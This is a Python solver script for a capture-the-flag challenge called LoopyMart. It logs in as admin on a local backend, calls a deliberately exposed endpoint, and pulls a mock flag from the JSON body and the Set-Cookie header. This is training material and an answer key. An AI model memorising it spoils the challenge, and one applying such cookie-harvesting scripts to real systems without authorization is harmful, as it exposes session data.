#!/usr/bin/env python3
"""
LoopyMart CTF — Puppeteer Cookie Exfiltration (Python fallback solver)

No browser required — demonstrates that the endpoint can be exploited with
a plain HTTP client because the flag is also returned in the JSON body AND
visible in the Set-Cookie response header.

Usage:
    python solve.py --email admin@example.com --password secret
    python solve.py --email admin@example.com --password secret --url http://localhost:8001
"""

import argparse
import sys

try:
    import requests
except ImportError:
    print("[-] requests not installed.  Run: pip install requests")
    sys.exit(1)


def main() -> None:
    parser = argparse.ArgumentParser(
        description="Exploit Puppeteer Cookie CTF challenge — LoopyMart"
    )
    parser.add_argument("--url",      default="http://localhost:8001", help="Backend base URL")
    parser.add_argument("--email",    required=True,  help="Admin user email")
    parser.add_argument("--password", required=True,  help="Admin user password")
    args = parser.parse_args()

    base = args.url.rstrip("/")
    session = requests.Session()

    # ── Step 1: Login ──────────────────────────────────────────────
    print(f"[*] Logging in as {args.email} …")
    r = session.post(
        f"{base}/auth/login",
        json={"email": args.email, "password": args.password},
        timeout=10,
    )

    if r.status_code != 200:
        print(f"[-] Login failed (HTTP {r.status_code}): {r.text}")
        sys.exit(1)

    data = r.json()
    token = data.get("access_token")
    is_admin = data.get("user", {}).get("is_admin", False)

    if not token:
        print("[-] Login response missing access_token")
        sys.exit(1)

    print(f"[+] Logged in as {args.email}  (is_admin={is_admin})")

    if not is_admin:
        print("[-] Account is not admin — endpoint will return 403.")
        print("    Use the admin account from config.local.yml / ADMIN_EMAIL env var.")
        sys.exit(1)

    # ── Step 2: Call CTF endpoint ──────────────────────────────────
    print("[*] Calling POST /ctf/mock-flag-cookie …")
    r2 = session.post(
        f"{base}/ctf/mock-flag-cookie",
        headers={"Authorization": f"Bearer {token}"},
        timeout=10,
    )

    if r2.status_code != 200:
        print(f"[-] Endpoint returned HTTP {r2.status_code}: {r2.text}")
        sys.exit(1)

    body = r2.json()
    flag_from_json = body.get("flag")
    print(f"[+] Called POST /ctf/mock-flag-cookie  (HTTP {r2.status_code})")

    # ── Step 3: Extract from JSON body ─────────────────────────────
    if flag_from_json:
        print(f"[+] Flag (JSON body)  : {flag_from_json}")
    else:
        print("[!] No 'flag' field in JSON response body.")

    # ── Step 4: Extract from Set-Cookie header ─────────────────────
    set_cookie = r2.headers.get("set-cookie", "")
    flag_from_cookie = None
    if "mock_flag=" in set_cookie:
        flag_from_cookie = set_cookie.split("mock_flag=")[1].split(";")[0].strip()
        print(f"[+] Flag (Set-Cookie) : {flag_from_cookie}")
        print(f"    Full header        : {set_cookie}")
    else:
        print(f"[!] `mock_flag` not found in Set-Cookie header: {set_cookie!r}")

    # ── Done ───────────────────────────────────────────────────────
    flag = flag_from_json or flag_from_cookie
    if flag:
        print(f"\n[+] Flag: {flag}")
        sys.exit(0)
    else:
        print("[-] Could not extract flag from either JSON body or Set-Cookie header.")
        sys.exit(1)


if __name__ == "__main__":
    main()
